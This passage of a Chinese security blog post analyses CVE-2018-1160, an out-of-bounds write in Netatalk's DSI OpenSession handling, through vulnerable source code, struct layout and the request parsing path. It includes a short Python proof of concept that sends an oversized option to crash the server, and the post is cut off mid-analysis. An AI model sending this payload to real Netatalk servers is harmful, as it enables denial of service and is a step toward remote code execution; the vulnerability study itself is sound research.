<!DOCTYPE html>


<html lang="zh-CN">
  

    <head>
      <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8" />
        
      <meta name="description" content="Boom? PWN ! ! !" />
      
      <meta
        name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=1"
      />
      <title>CVE-2018-1160 Netatalk 越界写入 |  北极落小雪</title>
  <meta name="generator" content="hexo-theme-ayer">
      
      <link rel="shortcut icon" href="/favicon.ico" />
       
<link rel="stylesheet" href="/dist/main.css">

      
<link rel="stylesheet" href="/css/fonts/remixicon.css">

      
<link rel="stylesheet" href="/css/custom.css">
 
      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
       
 

      <link
        rel="stylesheet"
        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
      />
      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>

      <!-- mermaid -->
      
      <style>
        .swal2-styled.swal2-confirm {
          font-size: 1.6rem;
        }
      </style>
    
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style><!-- hexo-inject:begin --><!-- hexo-inject:end -->
<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
  </html>
</html>


<body>
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="app">
    
      
    <main class="content on">
      <section class="outer">
  <article
  id="post-CVE-2018-1160 Netatalk-OOB"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
  CVE-2018-1160 Netatalk 越界写入
</h1>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2024/CVE-2018-1160%20Netatalk-OOB/" class="article-date">
  <time datetime="2024-01-27T16:00:00.000Z" itemprop="datePublished">2024-01-28</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/Pwn/">Pwn</a> / <a class="article-category-link" href="/categories/Pwn/%E5%BA%94%E7%94%A8%E5%B1%82/">应用层</a>
  </div>
  
<div class="word_count">
    <span class="post-time">
        <span class="post-meta-item-icon">
            <i class="ri-quill-pen-line"></i>
            <span class="post-meta-item-text"> 字数统计:</span>
            <span class="post-count">3.6k</span>
        </span>
    </span>

    <span class="post-time">
        &nbsp; | &nbsp;
        <span class="post-meta-item-icon">
            <i class="ri-book-open-line"></i>
            <span class="post-meta-item-text"> 阅读时长≈</span>
            <span class="post-count">18 分钟</span>
        </span>
    </span>
</div>
 
    </div>
      
    <div class="tocbot"></div>




  
    <div class="article-entry" itemprop="articleBody">
       
  <p>“世界上最遥远的距离,是任意地址写和ASLR”</p>
<span id="more"></span>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>首先查看漏洞报告中的关键信息.</p>
<blockquote>
<p><code>Netatalk</code> before <code>3.1.12</code> is vulnerable to an <code>out of bounds write</code> in <code>dsi_opensess.c</code>. This is due to lack of bounds checking on attacker controlled data. A remote unauthenticated attacker can leverage this vulnerability to achieve arbitrary code execution. <a target="_blank" rel="noopener" href="https://github.com/advisories/GHSA-j675-7hvj-qfw5">https://github.com/advisories/GHSA-j675-7hvj-qfw5</a></p>
</blockquote>
<p>搜索得知Netatalk是开源的AFP协议的文件服务器,下载源码到本地.</p>
<p>定位到漏洞函数dsi_opensession.</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* OpenSession. set up the connection */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">dsi_opensession</span><span class="params">(DSI *dsi)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">uint32_t</span> i = <span class="number">0</span>; <span class="comment">/* this serves double duty. it must be 4-bytes long */</span></span><br><span class="line">  <span class="type">int</span> offs;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (setnonblock(dsi-&gt;socket, <span class="number">1</span>) &lt; <span class="number">0</span>) {</span><br><span class="line">      LOG(log_error, logtype_dsi, <span class="string">"dsi_opensession: setnonblock: %s"</span>, strerror(errno));</span><br><span class="line">      AFP_PANIC(<span class="string">"setnonblock error"</span>);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* parse options */</span></span><br><span class="line">  <span class="keyword">while</span> (i &lt; dsi-&gt;cmdlen) {</span><br><span class="line">    <span class="keyword">switch</span> (dsi-&gt;commands[i++]) {</span><br><span class="line">    <span class="keyword">case</span> DSIOPT_ATTNQUANT:</span><br><span class="line">      <span class="built_in">memcpy</span>(&amp;dsi-&gt;attn_quantum, dsi-&gt;commands + i + <span class="number">1</span>, dsi-&gt;commands[i]);</span><br><span class="line">      dsi-&gt;attn_quantum = ntohl(dsi-&gt;attn_quantum);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> DSIOPT_SERVQUANT: <span class="comment">/* just ignore these */</span></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      i += dsi-&gt;commands[i] + <span class="number">1</span>; <span class="comment">/* forward past length tag + length */</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* let the client know the server quantum. we don't use the</span></span><br><span class="line"><span class="comment">   * max server quantum due to a bug in appleshare client 3.8.6. */</span></span><br><span class="line">  dsi-&gt;header.dsi_flags = DSIFL_REPLY;</span><br><span class="line">  dsi-&gt;header.dsi_data.dsi_code = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* dsi-&gt;header.dsi_command = DSIFUNC_OPEN;*/</span></span><br><span class="line"></span><br><span class="line">  dsi-&gt;cmdlen = <span class="number">2</span> * (<span class="number">2</span> + <span class="keyword">sizeof</span>(i)); <span class="comment">/* length of data. dsi_send uses it. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* DSI Option Server Request Quantum */</span></span><br><span class="line">  dsi-&gt;commands[<span class="number">0</span>] = DSIOPT_SERVQUANT;</span><br><span class="line">  dsi-&gt;commands[<span class="number">1</span>] = <span class="keyword">sizeof</span>(i);</span><br><span class="line">  i = htonl(( dsi-&gt;server_quantum &lt; DSI_SERVQUANT_MIN || </span><br><span class="line">	      dsi-&gt;server_quantum &gt; DSI_SERVQUANT_MAX ) ? </span><br><span class="line">	    DSI_SERVQUANT_DEF : dsi-&gt;server_quantum);</span><br><span class="line">  <span class="built_in">memcpy</span>(dsi-&gt;commands + <span class="number">2</span>, &amp;i, <span class="keyword">sizeof</span>(i));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* AFP replaycache size option */</span></span><br><span class="line">  offs = <span class="number">2</span> + <span class="keyword">sizeof</span>(i);</span><br><span class="line">  dsi-&gt;commands[offs] = DSIOPT_REPLCSIZE;</span><br><span class="line">  dsi-&gt;commands[offs+<span class="number">1</span>] = <span class="keyword">sizeof</span>(i);</span><br><span class="line">  i = htonl(REPLAYCACHE_SIZE);</span><br><span class="line">  <span class="built_in">memcpy</span>(dsi-&gt;commands + offs + <span class="number">2</span>, &amp;i, <span class="keyword">sizeof</span>(i));</span><br><span class="line">  dsi_send(dsi);</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>关键代码:<br>虽然没有其他信息,但从变量命名就能推断出这里明显有个溢出.<br>memcpy的第二个参数和第三个参数都来自dsi-&gt;commands,而作为一个文件服务器,推断dsi-&gt;commands是可控的.即写入的内容与大小均可控.</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* parse options */</span></span><br><span class="line"><span class="keyword">while</span> (i &lt; dsi-&gt;cmdlen) {</span><br><span class="line">  <span class="keyword">switch</span> (dsi-&gt;commands[i++]) {</span><br><span class="line">  <span class="keyword">case</span> DSIOPT_ATTNQUANT:</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;dsi-&gt;attn_quantum, dsi-&gt;commands + i + <span class="number">1</span>, dsi-&gt;commands[i]);</span><br><span class="line">    dsi-&gt;attn_quantum = ntohl(dsi-&gt;attn_quantum);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> DSIOPT_SERVQUANT: <span class="comment">/* just ignore these */</span></span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    i += dsi-&gt;commands[i] + <span class="number">1</span>; <span class="comment">/* forward past length tag + length */</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>同时能看出dsi的命令格式.</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x0: DSI会话选项</span><br><span class="line">0x01: 命令中数据长度</span><br><span class="line">0x02: 数据</span><br></pre></td></tr></tbody></table></figure>

<p>分析一下溢出对象.</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* child and parent processes might interpret a couple of these</span></span><br><span class="line"><span class="comment"> * differently. */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DSI</span> {</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">DSI</span> *<span class="title">next</span>;</span>             <span class="comment">/* multiple listening addresses */</span></span><br><span class="line">    AFPObj   *AFPobj;</span><br><span class="line">    <span class="type">int</span>      statuslen;</span><br><span class="line">    <span class="type">char</span>     status[<span class="number">1400</span>];</span><br><span class="line">    <span class="type">char</span>     *signature;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dsi_block</span>        <span class="title">header</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span> <span class="title">server</span>, <span class="title">client</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">itimerval</span>        <span class="title">timer</span>;</span></span><br><span class="line">    <span class="type">int</span>      tickle;            <span class="comment">/* tickle count */</span></span><br><span class="line">    <span class="type">int</span>      in_write;          <span class="comment">/* in the middle of writing multiple packets,</span></span><br><span class="line"><span class="comment">                                   signal handlers can't write to the socket */</span></span><br><span class="line">    <span class="type">int</span>      msg_request;       <span class="comment">/* pending message to the client */</span></span><br><span class="line">    <span class="type">int</span>      down_request;      <span class="comment">/* pending SIGUSR1 down in 5 mn */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> attn_quantum, datasize, server_quantum;</span><br><span class="line">    <span class="type">uint16_t</span> serverID, clientID;</span><br><span class="line">    <span class="type">uint8_t</span>  *commands; <span class="comment">/* DSI recieve buffer */</span></span><br><span class="line">    <span class="type">uint8_t</span>  data[DSI_DATASIZ];    <span class="comment">/* DSI reply buffer */</span></span><br><span class="line">    <span class="type">size_t</span>   datalen, cmdlen;</span><br><span class="line">    <span class="type">off_t</span>    read_count, write_count;</span><br><span class="line">    <span class="type">uint32_t</span> flags;             <span class="comment">/* DSI flags like DSI_SLEEPING, DSI_DISCONNECTED */</span></span><br><span class="line">    <span class="type">int</span>      socket;            <span class="comment">/* AFP session socket */</span></span><br><span class="line">    <span class="type">int</span>      serversock;        <span class="comment">/* listening socket */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* DSI readahead buffer used for buffered reads in dsi_peek */</span></span><br><span class="line">    <span class="type">size_t</span>   dsireadbuf;        <span class="comment">/* size of the DSI readahead buffer used in dsi_peek() */</span></span><br><span class="line">    <span class="type">char</span>     *buffer;           <span class="comment">/* buffer start */</span></span><br><span class="line">    <span class="type">char</span>     *start;            <span class="comment">/* current buffer head */</span></span><br><span class="line">    <span class="type">char</span>     *eof;              <span class="comment">/* end of currently used buffer */</span></span><br><span class="line">    <span class="type">char</span>     *end;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> USE_ZEROCONF</span></span><br><span class="line">    <span class="type">char</span> *bonjourname;      <span class="comment">/* server name as UTF8 maxlen MAXINSTANCENAMELEN */</span></span><br><span class="line">    <span class="type">int</span> zeroconf_registered;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* protocol specific open/close, send/receive</span></span><br><span class="line"><span class="comment">     * send/receive fill in the header and use dsi-&gt;commands.</span></span><br><span class="line"><span class="comment">     * write/read just write/read data */</span></span><br><span class="line">    <span class="type">pid_t</span>  (*proto_open)(<span class="keyword">struct</span> DSI *);</span><br><span class="line">    <span class="type">void</span>   (*proto_close)(<span class="keyword">struct</span> DSI *);</span><br><span class="line">} DSI;</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>由于表示数据长度的空间只有1字节,所以最大写入长度为0xff,所以能溢出的成员变量为:</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint32_t</span> attn_quantum, datasize, server_quantum;</span><br><span class="line"><span class="type">uint16_t</span> serverID, clientID;</span><br><span class="line"><span class="type">uint8_t</span>  *commands; <span class="comment">/* DSI recieve buffer */</span></span><br><span class="line"><span class="type">uint8_t</span>  data[DSI_DATASIZ];    <span class="comment">/* DSI reply buffer */</span></span><br></pre></td></tr></tbody></table></figure>
<p>从变量名初步判断,覆盖datasize或server_quantum( The server acknowledges the request and returns the size of its data receive buffer)可能可以造成一个越界读写,覆盖commands指针可能能造成一个任意读写.</p>
<p>查一下交叉引用,稍微分析一下程序的流程.发现整个程序都与DSI有关,于是查询DSI的相关信息.关键词: DSI AFP.</p>
<blockquote>
<p>The Data Stream Interface (DSI) is a session layer used to carry Apple Filing Protocol traffic over Transmission Control Protocol.</p>
</blockquote>
<blockquote>
<p>A session is set up by the client sending a DSIOpenSession, which will include the size of the receive buffer the client has for packets (called the request quantum, typically 1024 bytes). The server acknowledges the request and returns the size of its data receive buffer (typically 256k on Mac OS X Leopard).</p>
</blockquote>
<blockquote>
<p>Session closure can be initiated by either side by sending DSICloseSession. The sender does not need to wait for a reply and should immediately close the session after sending the message.</p>
</blockquote>
<blockquote>
<p>Maintaining the connection is done by tickling. DSI provides a mechanism for ensuring that client and server know that the other is still active. Every 30 seconds of inactivity, the server sends a tickle request to the client. Similarly, the client also sends its own tickle. (This is NOT a response packet.) Either the client or server can terminate the DSI session if they fail to hear from the other for 120 seconds. The client may also disconnect if a request is in flight and neither a response nor tickle is received within 60 seconds (in Mac OS X v.10.2 and later).</p>
</blockquote>
<p>嘶,这格式怎么和之前分析的不一样啊…..<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202401271739423.png"></p>
<p>查看dsi-&gt;command的交叉引用,找到这样一条调用链:</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">main</span><br><span class="line">    -&gt;afp_over_dsi</span><br><span class="line">        -&gt;dsi_stream_receive</span><br></pre></td></tr></tbody></table></figure>

<p>最后的dsi_stream_receive函数便是解析输入的地方.<br>稍微分析一下,解决之前协议格式的疑问:我之前推出的格式是DSIOpenSession的payload部分的格式.</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*!</span></span><br><span class="line"><span class="comment"> * Read DSI command and data</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param  dsi   (rw) DSI handle</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @return    DSI function on success, 0 on failure</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">dsi_stream_receive</span><span class="params">(DSI *dsi)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> block[DSI_BLOCKSIZ];</span><br><span class="line"></span><br><span class="line">  LOG(log_maxdebug, logtype_dsi, <span class="string">"dsi_stream_receive: START"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dsi-&gt;flags &amp; DSI_DISCONNECTED)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* read in the header */</span></span><br><span class="line">  <span class="keyword">if</span> (dsi_buffered_stream_read(dsi, (<span class="type">uint8_t</span> *)block, <span class="keyword">sizeof</span>(block)) != <span class="keyword">sizeof</span>(block)) </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  dsi-&gt;header.dsi_flags = block[<span class="number">0</span>];</span><br><span class="line">  dsi-&gt;header.dsi_command = block[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dsi-&gt;header.dsi_command == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;dsi-&gt;header.dsi_requestID, block + <span class="number">2</span>, <span class="keyword">sizeof</span>(dsi-&gt;header.dsi_requestID));</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;dsi-&gt;header.dsi_data.dsi_doff, block + <span class="number">4</span>, <span class="keyword">sizeof</span>(dsi-&gt;header.dsi_data.dsi_doff));</span><br><span class="line">  dsi-&gt;header.dsi_data.dsi_doff = htonl(dsi-&gt;header.dsi_data.dsi_doff);</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;dsi-&gt;header.dsi_len, block + <span class="number">8</span>, <span class="keyword">sizeof</span>(dsi-&gt;header.dsi_len));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;dsi-&gt;header.dsi_reserved, block + <span class="number">12</span>, <span class="keyword">sizeof</span>(dsi-&gt;header.dsi_reserved));</span><br><span class="line">  dsi-&gt;clientID = ntohs(dsi-&gt;header.dsi_requestID);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* make sure we don't over-write our buffers. */</span></span><br><span class="line">  dsi-&gt;cmdlen = MIN(ntohl(dsi-&gt;header.dsi_len), dsi-&gt;server_quantum);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Receiving DSIWrite data is done in AFP function, not here */</span></span><br><span class="line">  <span class="keyword">if</span> (dsi-&gt;header.dsi_data.dsi_doff) {</span><br><span class="line">      LOG(log_maxdebug, logtype_dsi, <span class="string">"dsi_stream_receive: write request"</span>);</span><br><span class="line">      dsi-&gt;cmdlen = dsi-&gt;header.dsi_data.dsi_doff;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dsi_stream_read(dsi, dsi-&gt;commands, dsi-&gt;cmdlen) != dsi-&gt;cmdlen)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  LOG(log_debug, logtype_dsi, <span class="string">"dsi_stream_receive: DSI cmdlen: %zd"</span>, dsi-&gt;cmdlen);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> block[<span class="number">1</span>];</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>写个Poc打一发,</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">payload = b<span class="number">''</span></span><br><span class="line">payload += b<span class="number">'</span>\x01<span class="number">'</span></span><br><span class="line">payload += b<span class="number">'</span>\xff<span class="number">'</span></span><br><span class="line">payload += b<span class="number">'</span>a<span class="number">'</span>*<span class="number">0xff</span></span><br><span class="line"></span><br><span class="line">lenth = len(payload)</span><br><span class="line"></span><br><span class="line">header = b<span class="number">''</span></span><br><span class="line">header += b<span class="number">'</span>\x00<span class="number">'</span> <span class="meta">#flags</span></span><br><span class="line">header += b<span class="number">'</span>\x04<span class="number">'</span> <span class="meta">#command</span></span><br><span class="line">header += p16(<span class="number">1</span>) <span class="meta">#request id</span></span><br><span class="line">header += p32(<span class="number">0</span>) <span class="meta">#offset</span></span><br><span class="line">header += p32(lenth)</span><br><span class="line">header += p32(<span class="number">0</span>) <span class="meta">#preserve</span></span><br><span class="line"></span><br><span class="line">io.send(header+payload)</span><br></pre></td></tr></tbody></table></figure>

<p>在解引用rcx+r9时崩溃<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202401272105426.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202401272105881.png"><br>对应到源码是,崩溃的原因是command指针已经破坏.</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i += dsi-&gt;commands[i] + <span class="number">1</span>; <span class="comment">/* forward past length tag + length */</span></span><br></pre></td></tr></tbody></table></figure>


<p>既然无法直接造成glibc级别的堆溢出(刚造的词),需要靠之前提过的DSI结构的几个字段进行利用,那么需要进一步分析一下整体流程,以及这几个字段的使用.</p>
<p>仅展示部分代码.<br>主进程循环通过poll调用等待连接事件,通过dsi_getsession设置会话(dsi),fork出子进程在afp_over_dsi中执行dsi命令.<br>套接字的socket,bind,listen以及会话的初始化在configinit中完成,poll的监听集合在init_listening_sockets中初始化.</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) {</span><br><span class="line">  ......</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (afp_config_parse(&amp;obj, <span class="string">"afpd"</span>) != <span class="number">0</span>)</span><br><span class="line">            afp_exit(EXITERR_CONF);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (configinit(&amp;obj) != <span class="number">0</span>) {</span><br><span class="line">            LOG(log_error, logtype_afpd, <span class="string">"config re-read: no servers configured"</span>);</span><br><span class="line">            afp_exit(EXITERR_CONF);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!(init_listening_sockets(&amp;obj))) {</span><br><span class="line">            LOG(log_error, logtype_afpd, <span class="string">"main: couldn't initialize socket handler"</span>);</span><br><span class="line">            afp_exit(EXITERR_CONF);</span><br><span class="line">        }</span><br><span class="line">  ......</span><br><span class="line">  </span><br><span class="line">        ret = poll(asev-&gt;fdset, asev-&gt;used, <span class="number">-1</span>);</span><br><span class="line">  ......</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; asev-&gt;used; i++) {</span><br><span class="line">            <span class="keyword">if</span> (asev-&gt;fdset[i].revents &amp; (POLLIN | POLLERR | POLLHUP | POLLNVAL)) {</span><br><span class="line">                <span class="keyword">switch</span> (asev-&gt;data[i].fdtype) {</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> LISTEN_FD:</span><br><span class="line">                    <span class="keyword">if</span> ((child = dsi_start(&amp;obj, (DSI *)(asev-&gt;data[i].private), server_children))) {</span><br><span class="line">                        <span class="keyword">if</span> (!(asev_add_fd(asev, child-&gt;afpch_ipc_fd, IPC_FD, child))) {</span><br><span class="line">                            LOG(log_error, logtype_afpd, <span class="string">"out of asev slots"</span>);</span><br><span class="line">                            ......</span><br><span class="line">                        }</span><br><span class="line">                    }</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                    ......</span><br><span class="line">                } <span class="comment">/* switch */</span></span><br><span class="line">            }  <span class="comment">/* if */</span></span><br><span class="line">        } <span class="comment">/* for (i)*/</span></span><br><span class="line">    } <span class="comment">/* while (1) */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">afp_child_t</span> *<span class="title function_">dsi_start</span><span class="params">(AFPObj *obj, 